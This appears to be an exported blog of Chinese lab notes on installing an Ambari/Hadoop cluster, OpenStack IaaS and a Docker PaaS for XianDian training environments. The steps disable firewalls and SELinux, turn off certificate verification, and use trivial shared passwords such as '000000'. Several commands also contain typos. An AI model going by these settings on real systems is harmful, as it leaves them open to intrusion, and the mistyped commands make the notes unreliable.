<p><strong><code>ping slave1.hadoop</code></strong>        //检测</p>
<h3 id="slave1"><a href="#slave1" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>hostnamectl set-hostname slave1</code></strong></p>
<p><strong><code>hostname</code></strong></p>
<p><strong><code>logout</code></strong></p>
<p><strong><code>vi /etc/hosts</code></strong></p>
<blockquote>
<p>192.168.200.131 master.hadoop</p>
<p>192.168.200.133 slave1.hadoop slave1</p>
</blockquote>
<p><strong><code>ping master.hadoop</code></strong></p>
<hr>
<h3 id="master-1"><a href="#master-1" class="headerlink" title="master"></a>master</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/ambari.repo</code></strong>        //新建yum源配置文件</p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos/</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[ambari]</p>
<p>name=ambari</p>
<p>baseurl=file:///opt/ambari/ambari-2.6.0.0</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/ambari</code></strong></p>
<p><strong><code>mount XianDian-BigData-v2.2.iso /opt/ambari/</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum install -y vsftpd</code></strong>                //搭建ftp服务器</p>
<p><strong><code>vi /etc/vsftpd/vsftpd.conf</code></strong>        //修改ftp根目录</p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing=&gt;SELINUX=disabled</em>        //disabled需要修改文件后重启生效，permissive也可</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>                     //设为Permissive,1为enforcing</p>
<p><strong><code>getenforce</code></strong>                        //获得Selinux的状态</p>
<blockquote>
<p>Permissive</p>
</blockquote>
<p><strong><code>systemctl disable firewalld</code></strong>        //关闭防火墙和Selinux，先电镜像是关闭的无需操作</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<h3 id="slave1-1"><a href="#slave1-1" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/ambari.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos/</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[ambari]</p>
<p>name=ambari</p>
<p>baseurl=ftp://192.168.200.131/ambari/ambari-2.6.0.0</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing =&gt; SELINUX=disabled</em>        //disabled需要修改文件后重启生效，permissive也可</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>                     //设为Permissive,1为enforcing</p>
<p><strong><code>getenforce</code></strong>                        //获得Selinux的状态</p>
<blockquote>
<p><em>Permissive</em></p>
</blockquote>
<p><strong><code>systemctl disable firewalld</code></strong>        //关闭防火墙和Selinux，先电镜像是关闭的无需操作</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<hr>
<h3 id="master-2"><a href="#master-2" class="headerlink" title="master"></a>master</h3><p><strong><code>yum -y install httpd</code></strong></p>
<p><strong><code>cp -r /opt/ambari/HDP-* /var/www/html/</code></strong></p>
<p><strong><code>systemctl enable httpd</code></strong></p>
<p><strong><code>systemctl start httpd</code></strong></p>
<p><strong><code>yum -y install ntp</code></strong></p>
<p><strong><code>vi /etc/ntp.conf</code></strong></p>
<blockquote>
<h1 id="server-0-centos-pool-ntp-org-iburst-将原有的四条注释掉"><a href="#server-0-centos-pool-ntp-org-iburst-将原有的四条注释掉" class="headerlink" title="server 0.centos.pool.ntp.org iburst        //将原有的四条注释掉"></a>server 0.centos.pool.ntp.org iburst        //将原有的四条注释掉</h1><h1 id="server-1-centos-pool-ntp-org-iburst"><a href="#server-1-centos-pool-ntp-org-iburst" class="headerlink" title="server 1.centos.pool.ntp.org iburst"></a>server 1.centos.pool.ntp.org iburst</h1><h1 id="server-2-centos-pool-ntp-org-iburst"><a href="#server-2-centos-pool-ntp-org-iburst" class="headerlink" title="server 2.centos.pool.ntp.org iburst"></a>server 2.centos.pool.ntp.org iburst</h1><h1 id="server-3-centos-pool-ntp-org-iburst"><a href="#server-3-centos-pool-ntp-org-iburst" class="headerlink" title="server 3.centos.pool.ntp.org iburst"></a>server 3.centos.pool.ntp.org iburst</h1><p>server 127.127.1.0                    //添加两行</p>
<p>fudge 127.127.1.0 startum 10</p>
</blockquote>
<p><strong><code>systemctl enable ntpd</code></strong></p>
<p><strong><code>systemctl start ntpd</code></strong></p>
<h3 id="slave1-2"><a href="#slave1-2" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>yum install -y ntpdate</code></strong></p>
<p><strong><code>ntpdate master.hadoop</code></strong></p>
<p><strong><code>systemctl enable ntpdate</code></strong></p>
<hr>
<h3 id="master-3"><a href="#master-3" class="headerlink" title="master"></a>master</h3><p><strong><code>ssh slave1.hadoop</code></strong>        //检测能否用无密码公钥认证访问（第一次需要用确认使用公钥访问），若不能则需要配置无密码公钥访问    使用<strong>exit</strong>退出连接</p>
<p><strong><code>ssh-keygen</code></strong>                //生成公钥</p>
<p><strong><code>ssh-copy-id slave1.hadoop</code></strong>        //将公钥复制到目标主机</p>
<h3 id="slave1-3"><a href="#slave1-3" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>ssh master1.hadoop#</code></strong></p>
<p><strong><code>ssh-keygen</code></strong></p>
<p><strong><code>ssh-copy-id slave1.hadoop</code></strong></p>
<hr>
<h3 id="master-amp-slave1"><a href="#master-amp-slave1" class="headerlink" title="master&amp;slave1"></a>master&amp;slave1</h3><p><strong><code>cat /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<blockquote>
<blockquote>
<p>[always] madvise never    //Transparent Huge Pages状态为开启的，需要关闭，该文件不可编辑，不能永久修改所有修改==<strong>重启后失效</strong>==</p>
</blockquote>
</blockquote>
<p><strong><code>echo never &gt;  /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<p><strong><code>echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</code></strong></p>
<p><strong><code>cat /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<blockquote>
<blockquote>
<p>always madvise [never]    //关闭状态</p>
</blockquote>
</blockquote>
<hr>
<h3 id="master-4"><a href="#master-4" class="headerlink" title="master"></a>master</h3><p><strong><code>mkdir /usr/jdk64/</code></strong></p>
<p><strong><code>tar -zxvf /opt/ambari/jdk-8u77-linux-x64.tar.gz -C /usr/jdk64/</code></strong></p>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export JAVA_HOME=/usr/jdk64/jdk1.8.0_77</p>
<p>export PATH=$JAVA_HOME/bin:$PATH</p>
</blockquote>
<p><strong><code>source /etc/profile</code></strong></p>
<p><strong><code>java -version</code></strong></p>
<blockquote>
<blockquote>
<p>java version “1.8.0_77”</p>
<p>Java(TM) SE Runtime Environment (build 1.8.0_77-b03)</p>
<p>Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode)</p>
</blockquote>
</blockquote>
<p><strong><code>scp /opt/ambari/jdk-8u77-linux-x64.tar.gz 192.168.200.133:/opt</code></strong>        //通过ssh的scp将文件发到目标机</p>
<h3 id="slave1-4"><a href="#slave1-4" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>mkdir /usr/jdk64jdk1.8.0_77/</code></strong></p>
<p><strong><code>tar -zxvf /opt/jdk-8u77-linux-x64.tar.gz -C /usr/jdk64/</code></strong></p>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export JAVA_HOME=/usr/jdk64/jdk1.8.0_77</p>
<p>export PATH=$JAVA_HOME/bin:$PATH</p>
</blockquote>
<p><strong><code>source /etc/profile</code></strong></p>
<p><strong><code>java -version</code></strong></p>
<blockquote>
<blockquote>
<p>java version “1.8.0_77”</p>
<p>Java(TM) SE Runtime Environment (build 1.8.0_77-b03)</p>
<p>Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode)</p>
</blockquote>
</blockquote>
<hr>
<h2 id="配置ambari"><a href="#配置ambari" class="headerlink" title="配置ambari"></a>配置ambari</h2><h3 id="master-5"><a href="#master-5" class="headerlink" title="master"></a>master</h3><p><strong><code>yum -y install ambari-server</code></strong></p>
<p><strong><code>yum -y install mariadb mariadb-server mysql-connector-java</code></strong></p>
<p><strong><code>systemctl enable mariadb</code></strong></p>
<p><strong><code>systemctl start mariadb</code></strong></p>
<p><strong><code>mysql_secure_installation</code></strong></p>
<blockquote>
<blockquote>
<p>Enter current password for root (enter for none):        //初始时无密码自接回车</p>
<p>Set root password? [Y/n]<strong><code>y</code></strong>    //设置root密码为“<code>bigdata</code>”</p>
<p>New password:         //填入密码是不显示的</p>
<p>Re-enter new password:</p>
<p>Remove anonymous users? [Y/n]<strong><code>y</code></strong>        //删除匿名用户</p>
<p>Disallow root login remotely? [Y/n] <strong><code>n</code></strong>    //是否禁用root远程登录</p>
<p>Remove test database and access to it? [Y/n] <strong><code>y</code></strong>    //删除测试数据库</p>
<p>Reload privilege tables now? [Y/n]<strong><code>y</code></strong>        //从新加载权限表</p>
</blockquote>
</blockquote>
<p><strong><code>mysql -uroot -pbigdata</code></strong></p>
<blockquote>
<blockquote>
<p>MariaDB [(none)]&gt;<strong><code>create database ambari;</code></strong></p>
<p>MariaDB [(none)]&gt; <strong><code>grant all privileges on ambari.* to &#39;ambari&#39;@&#39;localhost&#39; identified by &#39;bigdata&#39;;</code></strong></p>
<p>MariaDB [(none)]&gt; <strong><code>grant all privileges on ambari.* to &#39;ambari&#39;@&#39;%&#39; identified by &#39;bigdata&#39;;</code></strong></p>
<p>MariaDB [(none)]&gt;<strong><code>use ambari;</code></strong></p>
<p>MariaDB [ambari]&gt; <strong><code>source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</code></strong><br>MariaDB [ambari]&gt;<code>quit</code></p>
</blockquote>
</blockquote>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export buildNumber=2.6.0.0</p>
</blockquote>
<p><strong><code>ambari-server setup</code></strong></p>
<blockquote>
<blockquote>
<p>Customize user account for ambari-server daemon [y/n] (n)? <strong><code>n</code></strong></p>
<p>Checking JDK…</p>
<p>[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8</p>
<p>[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7</p>
<p>[3] Custom JDk</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Enter choice (1):<strong><code>3</code></strong></p>
<p>Path to JAVA_HOME: <strong><code>/usr/jdk64/jdk1.8.0_77</code></strong></p>
<p>Enter advanced database configuration [y/n] (n)? <strong><code>y</code></strong></p>
<p>Configuring database…</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Choose one of the following options:</p>
<p>[1] - PostgreSQL (Embedded)</p>
<p>[2] - Oracle</p>
<p>[3] - MySQL / MariaDB</p>
<p>[4] - PostgreSQL</p>
<p>[5] - Microsoft SQL Server (Tech Preview)</p>
<p>[6] - SQL Anywhere</p>
<p>[7] - BDB</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Enter choice (1): <strong><code>3</code></strong></p>
<p>Hostname (localhost): </p>
<p>Port (3306): </p>
<p>Database name (ambari): </p>
<p>Username (ambari): </p>
<p>Enter Database Password (bigdata): </p>
<p>Proceed with configuring remote database connection properties [y/n] (y)?</p>
</blockquote>
</blockquote>
<p><strong><code>ambari-server start</code></strong></p>
<p><a href="http://192.168.100.131:8080">http://192.168.100.131:8080</a></p>
<blockquote>
<p>admin/admin        //用户名和密码</p>
</blockquote>
<h3 id="master-amp-slave1-1"><a href="#master-amp-slave1-1" class="headerlink" title="master&amp;slave1"></a>master&amp;slave1</h3><p><strong><code>yum install -y ambari-agent</code></strong></p>
<p><strong><code>vi /etc/ambari-agent/conf/ambari-agent.ini</code></strong></p>
<blockquote>
<p>[servier]</p>
<p><em>hostname=localhost =&gt; hostname=master.hadoop</em></p>
</blockquote>
<p><strong><code>systemctl start ambari-agent</code></strong></p>
<p><strong><code>ambari-agent restart</code></strong></p>
<p><strong><code>tail -f /var/log/ambari-agent/ambari-agent.log</code></strong></p>
<p>在python 2.7.5及以上版本时，增加了certificate verification，正是因为这个特性导致ambari-agent无法连接server</p>
<p>//解决方法：修改/etc/python/cert-verification.cfg配置文件：verify=platform_default ###(这是默认配置)</p>
<p>修改为verify=disable，然后重启ambari agent，就可以正常注册</p>
<p>HDFS</p>
<p>YARN+MapReduce2</p>
<p>ZooKeeper</p>
<p>Amvari Metrics</p>
<blockquote>
<p><strong>添加Hive服务前需要先对数据库进行操作</strong></p>
<h1 id="mysql-uroot-pbigdata"><a href="#mysql-uroot-pbigdata" class="headerlink" title="mysql -uroot -pbigdata"></a>mysql -uroot -pbigdata</h1><p>MariaDB [(none)]&gt; create database hive;  </p>
<p>MariaDB [(none)]&gt; grant all privileges on hive.* to ‘hive’@’localhost’ identified by ‘bigdata’;</p>
<p>MariaDB [(none)]&gt; grant all privileges on hive.* to ‘hive’@’%’ identified by ‘bigdata’; </p>
</blockquote>
<p>Hive</p>
<p>HBase</p>
<p>Mahout</p>
<p>Pig</p>
<p>Flume</p>
<p>Spark2</p>
]]></content>
  </entry>
  <entry>
    <title>先电云计算IAAS</title>
    <url>/posts/3b6f3669/</url>
    <content><![CDATA[<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="controller-amp-compute"><a href="#controller-amp-compute" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>vi /etc/sysconfig/network-scripts/ifcfg-eng</code></strong></p>
<blockquote>
<p>网卡1（内网）:</p>
<p>BOOTPROTO=static</p>
<p>IPADDR=192.168.100.10        //B：192.168.100.20</p>
<p>PREFIX=24            //NETMASK=255.255.255.0</p>
<p>GATEWAY=192.168.100.1</p>
</blockquote>
<a id="more"></a>
<blockquote>
<p>网卡2（外网）:</p>
<p>BOOTPROTO=static</p>
<p>IPADDR=192.168.200.20    //B：192.168.200.20</p>
<p>PREFIX=24    //NETMASK=255.255.255.0</p>
</blockquote>
<p><strong><code>service network restart</code></strong></p>
<hr>
<h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p><strong><code>hostnamectl set-hostname controller</code></strong></p>
<hr>
<h3 id="compute"><a href="#compute" class="headerlink" title="compute"></a>compute</h3><p><strong><code>hostnamectl set-hostname compute</code></strong></p>
<hr>
<h3 id="controller-amp-compute-1"><a href="#controller-amp-compute-1" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>logout</code></strong>            //Ctr+d  重新登录</p>
<hr>
<h3 id="controller-1"><a href="#controller-1" class="headerlink" title="controller"></a>controller</h3><p><strong><code>mv /etc/yum.repo.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/iaas.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=file:///opt/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[iaas]</p>
<p>name=iaas</p>
<p>baseurl=file:///opt/iaas/iaas-repo</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/&#123;centos,iaas&#125;</code></strong></p>
<p><strong><code>mount CentOS-7-x86_64-DVD-1511.iso /mnt</code></strong></p>
<p><strong><code>cp -rfv /mnt/* /opt/centos</code></strong></p>
<p><strong><code>umout XianDian-IaaS-v2.2.iso /mnt</code></strong></p>
<p><strong><code>cp -rfv /mnt/* /opt/iaas</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum  -y install vsftpd</code></strong></p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<p><strong><code>systemctl disable firewalld</code></strong></p>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing =&gt;</em> SELINUX=permissive</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong></p>
<p><strong><code>vi /vsftpd/vsftpd.conf</code></strong></p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<hr>
<h3 id="compute-1"><a href="#compute-1" class="headerlink" title="compute"></a>compute</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/iaas.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/opt/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[iaas]</p>
<p>name=iaas</p>
<p>baseurl=ftp://192.168.100.10/opt/iaas/iaas-repo</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p>//创建两个分区做准备，记下分区号</p>
<p><strong><code>parted /dev/md126</code></strong>            //进入磁盘管理，IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z），做了磁盘阵列的是md</p>
<p><strong>(parted)<code>p</code></strong></p>
<p><strong>(parted)<code>mkpart 名字 分区起点 分区终点</code></strong>         //上一个的分区的终点为下一个分区的终点，由起终点决定大小*</p>
<p><strong>(parted)<code>p</code></strong></p>
<p><strong>(parted)<code>quit</code></strong></p>
<p><strong><code>mkfs.xfs /dev/md126p4</code></strong>        //格式化分区，注意区号</p>
<p><strong><code>mkfs.xfs /dev/md126p5</code></strong></p>
<hr>
<h2 id="通过脚本安装相关服务"><a href="#通过脚本安装相关服务" class="headerlink" title="通过脚本安装相关服务"></a>通过脚本安装相关服务</h2><h3 id="controller-amp-compute-2"><a href="#controller-amp-compute-2" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>yum -y install iaas-xiandian</code></strong>            //安装xiandian包并配置环境变量</p>
<p><strong><code>vi /etc/xiandain/openrc.sh</code></strong></p>
<blockquote>
<p>HOST_IP=192.168.100.10            //控制节点内网</p>
<p>HOST_NAME=controller</p>
<p>HOST_IP_NODE=192.168.100.20    //计算节点内网</p>
<p>HOST_NAME_NODE=compute</p>
<p>RABBIT_USER=openstack</p>
<p>RABBIT_PASS=000000</p>
<p>DB_PASS=000000</p>
<p>DOMAIN_NAME=demo            //（自定义）</p>
<p>ADMIN_PASS=000000</p>
<p>DEMO_PASS=000000</p>
<p>KEYSTONE_DBPASS=000000</p>
<p>GLANCE_DBPASS=000000</p>
<p>GLANCE_PASS=000000</p>
<p>NOVA_DBPASS=000000</p>
<p>NOVA_PASS=000000</p>
<p>NEUTRON_DBPASS=000000</p>
<p>NEUTRON_PASS=000000</p>
<p>METADATA_SECRET=000000</p>
<p>INTERFACE_NAME=enp9s0            //（外网网卡名）</p>
<p>CINDER_DBPASS=000000</p>
<p>CINDER_PASS=000000</p>
<p>TROVE_DBPASS=000000</p>
<p>TROVE_PASS=000000</p>
<p>BLOCK_DISK=md126p4            //（空白分区名）在计算节点上创建</p>
<p>SWIFT_PASS=000000</p>
<p>OBJECT_DISK=md126p5            //（空白分区名）在计算节点上创建</p>
<p>STORAGE_LOCAL_NET_IP=192.168.100.20  //计算节点内网</p>
<p>HEAT_DBPASS=000000</p>
<p>HEAT_PASS=000000</p>
<p>CEILOMETER_DBPASS=000000</p>
<p>CEILOMETER_PASS=000000</p>
<p>AODH_DBPASS=000000</p>
<p>AODH_PASS=000000</p>
</blockquote>
<p>//过滤语句：<strong>cat /etc/xiandian/openrc.sh |grep -v ^# |grep -v ^$</strong>        //history  查看历史命令</p>
<p><strong><code>iaas-pre-host.sh</code></strong>            //基础配置</p>
<blockquote>
<p>yum -y install <em>openstack-utils</em> openstack-selinux python-openstackclient</p>
<p>yum upgrade</p>
<p>yum -y remove NetworkManager firewalld</p>
<p>yum -y install iptables</p>
<p>yum -y install ntp</p>
</blockquote>
<p><strong><code>yum -y install openstack-utils</code></strong>        //脚本内可能未安装，自己补上</p>
<hr>
<h3 id="controller-2"><a href="#controller-2" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-mysql.sh</code></strong>        //安装数据库相关服务</p>
<blockquote>
<p>yum -y install mysql  mysql-server  MySQL-python</p>
<p>yum -y install mongodb-server mongodb</p>
<p>yum -y install rabbitmq-server</p>
<p>yum -y install memcached python-memcached</p>
</blockquote>
<hr>
<h3 id="compute-2"><a href="#compute-2" class="headerlink" title="compute"></a>compute</h3><p><strong><code>yum -y install MySQL-python</code></strong></p>
<hr>
<h3 id="controller-3"><a href="#controller-3" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-keystone.sh</code></strong>            //安装Keystone认证服务</p>
<blockquote>
<p>yum -y install openstack-keystone httpd mod_wsgi</p>
</blockquote>
<p><strong><code>iaas-install-glance.sh</code></strong>            //安装Glance镜像服务</p>
<blockquote>
<p>yum -y install openstack-glance</p>
</blockquote>
<p>上传镜像：<br><strong><code>source /etc/keystone/admin-opemrc.sh</code></strong>            //加载上传镜像需要用到的变量</p>
<p><strong><code>glance image-create --name &quot;CentOS7.0&quot; --disk-format qcow2 --container-format bare --progress &lt; /opt/iaas/images/Centos_7-x86_64_XD.qcow2</code></strong></p>
<p><strong><code>iaas-install-nova-controller.sh</code></strong>            //安装nova计算服务</p>
<blockquote>
<p>yum install -y openstack-nova-api openstack-nova-conductor openstack-nova-console openstack-nova-novncproxy openstack-nova-scheduler</p>
</blockquote>
<hr>
<h3 id="compute-3"><a href="#compute-3" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-nova-compute.sh</code></strong></p>
<blockquote>
<p>yum -y install lvm2</p>
<p>yum -y install openstack-nova-compute</p>
</blockquote>
<hr>
<h3 id="controller-4"><a href="#controller-4" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-neutron-controller.sh</code></strong>            //安装Neutron网络服务</p>
<blockquote>
<p>yum install -y openstack-neutron openstack-neutron-ml2 openstack-neutron-linuxbridge ebtables  openstack-neutron-openvswitch openstack-neutron-lbaas python-neutron-lbaas haproxy  openstack-neutron-fwaas</p>
</blockquote>
<hr>
<h3 id="compute-4"><a href="#compute-4" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-neutron-compute.sh</code></strong></p>
<blockquote>
<p>yum install -y openstack-neutron-linuxbridge ebtables ipset openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch</p>
</blockquote>
<hr>
<h3 id="controller-5"><a href="#controller-5" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-neutron-controller-gre.sh</code></strong>            //创建gre网络</p>
<hr>
<h3 id="compute-5"><a href="#compute-5" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-neutron-compute-gre.sh</code></strong></p>
<hr>
<h3 id="controller-6"><a href="#controller-6" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-dashboard.sh</code></strong>            //安装Dadhboard仪表盘服务</p>
<blockquote>
<p>yum -y install openstack-dashboard</p>
</blockquote>
<p><strong><a href="http://192.168.100.10/dashboard">http://192.168.100.10/dashboard</a></strong></p>
<hr>
<h3 id="controller-7"><a href="#controller-7" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-cinder-controller.sh</code></strong>            //安装Cinder块存储服务</p>
<blockquote>
<p>yum install -y openstack-cinder</p>
<p>cinder create  —display-name myVolume 1    //使用cinder create 创建一个新的卷</p>
<p>cinder list        //通过cinder list 命令查看是否正确创建</p>
</blockquote>
<hr>
<h3 id="compute-6"><a href="#compute-6" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-cinder-compute.sh</code></strong></p>
<blockquote>
<p>yum -y install lvm2 targetcli python-keystone openstack-cinder</p>
</blockquote>
<hr>
<h3 id="controller-8"><a href="#controller-8" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-swift-controller.sh</code></strong>            //安装Swift对象存储服务</p>
<blockquote>
<p>yum install -y openstack-swift-proxy python-swiftclient python-keystoneclient python-keystonemiddleware memcached</p>
</blockquote>
<hr>
<h3 id="compute-7"><a href="#compute-7" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-swift-compute.sh</code></strong>            //面向对象数据存贮</p>
<blockquote>
<p>yum install -y xfsprogs rsync openstack-swift-account openstack-swift-container openstack-swift-object</p>
</blockquote>
<p><strong>执行过程中需要确认登录controller节点和输入controller节点root用户密码</strong></p>
<hr>
<h3 id="controller-9"><a href="#controller-9" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-trove.sh</code></strong>            //安装Trove数据库服务</p>
<p><strong><em>//需注意安装Trove服务之前需要配置好网络（flat或gre）,创建好子网，并确认系统已经安装swift和cinder两个服务，否则安装会失败</em></strong></p>
<blockquote>
<p>yum install –y openstack-trove-guestagent openstack-trove python-troveclient  openstack-trove-ui</p>
</blockquote>
<p><strong><code>iaas-install-heat.sh</code></strong>            //安装heat集群服务</p>
<blockquote>
<p>yum install -y openstack-heat-api openstack-heat-api-cfn openstack-heat-engine</p>
</blockquote>
<p><strong><code>iaas-install-ceilometer-controller.sh</code></strong>        //安装Ceilometer架空服务</p>
<blockquote>
<p>yum install -y openstack-ceilometer-api openstack-ceilometer-collector openstack-ceilometer-notification openstack-ceilometer-central python-ceilometerclient python-ceilometermiddleware</p>
</blockquote>
<hr>
<h3 id="compute-8"><a href="#compute-8" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-ceilometer-compute.sh</code></strong></p>
<blockquote>
<p>yum install -y openstack-ceilometer-compute python-ceilometerclient python-pecan</p>
</blockquote>
<hr>
<h3 id="controller-10"><a href="#controller-10" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-alarm.sh</code></strong>            //安装alarm监控服务</p>
<blockquote>
<p>yum install -y openstack-aodh-api openstack-aodh-evaluator openstack-aodh-notifier openstack-aodh-listener openstack-aodh-expirer python-ceilometerclient</p>
</blockquote>
<hr>
<h2 id="资源聚合"><a href="#资源聚合" class="headerlink" title="资源聚合"></a>资源聚合</h2><p><strong><em>在<code>/etc/xiandian/openrc.sh</code>里把<code>compute</code>节点的<code>IP</code>和主机名改为<code>controller</code>节点的IP和主机名</em></strong></p>
<p><strong><em>在控制节点运行 <code>iaas-install-nova-compute.sh</code></em></strong></p>
<h3 id="controller-11"><a href="#controller-11" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-nova-compute.sh</code></strong></p>
]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>先电云计算PAAS</title>
    <url>/posts/167e2e7c/</url>
    <content><![CDATA[<h2 id="基础环境配置"><a href="#基础环境配置" class="headerlink" title="基础环境配置"></a>基础环境配置</h2><h3 id="server-amp-amp-client"><a href="#server-amp-amp-client" class="headerlink" title="server&amp;&amp;client"></a>server&amp;&amp;client</h3><p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p>SELINUX=disavled    //若不将Selinux设为diabled则需要安装一个container-serlinux的包，该包要求版本大于2.14</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>        //reboot</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<a id="more"></a>
<p><strong><code>systemctl disable firewalld</code></strong></p>
<p><strong><code>iptavbles -F</code></strong></p>
<p><strong><code>iptable -X</code></strong></p>
<p><strong><code>iptable -Z</code></strong></p>
<p><strong><code>/usr/sbin/iptables-save</code></strong></p>
<p><strong><code>vi /etc/sysctl.conf</code></strong></p>
<blockquote>
<p>net.ipv4.ip_forward=1</p>
<p>net.ipv4.conf.default.rp_filter=0</p>
<p>net.ipv4.conf.all.rp_filter=0</p>
</blockquote>
<p><strong><code>sysctl -p</code></strong></p>
<p><strong><code>hostnamectl set-hostname server</code></strong>            //server节点</p>
<p><strong><code>hostnamectl set-hostname client</code></strong>            //client节点</p>
<p><strong><code>vi /etc/hoasts</code></strong></p>
<blockquote>
<p>10.0.3.137 server</p>
<p>10.0.3.138 client</p>
</blockquote>
<p><strong><code>ping server</code></strong></p>
<p><strong><code>ping client</code></strong></p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/docker.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[docker]</p>
<p>name=docker</p>
<p>baseurl=file:///opt/docker/docker</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/docker</code></strong></p>
<p><strong><code>mount XianDian-PaaS-v2.2.iso /opt/docker/</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
